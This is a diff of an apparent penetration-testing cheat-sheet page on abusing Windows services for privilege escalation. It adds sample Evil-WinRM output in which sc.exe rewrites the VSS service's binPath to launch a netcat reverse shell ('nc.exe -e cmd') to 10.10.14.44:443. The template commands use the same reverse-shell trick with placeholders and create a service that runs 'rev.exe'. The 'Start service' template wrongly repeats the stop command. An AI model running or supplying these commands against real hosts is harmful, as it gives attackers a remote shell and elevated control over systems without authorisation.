@@ -328,11 +328,21 @@ body.dark-mode #dynamicFormContainer button:hover {
 <h4 id="1-change-service-path">1. Change service path</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Assume nc.exe is uploaded
 </span></span><span class="line"><span class="cl"><span class="go">sc.exe config &lt;SERVICE&gt; binPath= &#34;C:\ProgramData\nc.exe -e cmd.exe &lt;LOCAL_IP&gt; &lt;LOCAL_PORT&gt;&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\windows\tasks&gt; sc.exe config VSS binpath=&#34;C:\windows\tasks\nc.exe -e cmd 10.10.14.44 443&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">[SC] ChangeServiceConfig SUCCESS
 </span></span></span></code></pre></div><h4 id="2-restart-service">2. Restart service</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Stop service
 </span></span><span class="line"><span class="cl"><span class="go">sc.exe stop &lt;SERVICE&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\windows\tasks&gt; sc.exe stop VSS
+</span></span></span><span class="line"><span class="cl"><span class="go">[SC] ControlService FAILED 1062:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">The service has not been started.
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start service
 </span></span><span class="line"><span class="cl"><span class="go">sc.exe stop &lt;SERVICE&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\windows\tasks&gt; sc.exe start VSS
+</span></span></span><span class="line"><span class="cl"><span class="go">[SC] StartService FAILED 1053:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">The service did not respond to the start or control request in a timely fashion.
 </span></span></span></code></pre></div><h3 id="additional-create-service">Additional: Create service</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create a service
 </span></span><span class="line"><span class="cl"><span class="go">sc.exe create &lt;NEW_SERVICE&gt; binpath= C:\ProgramData\rev.exe start= auto
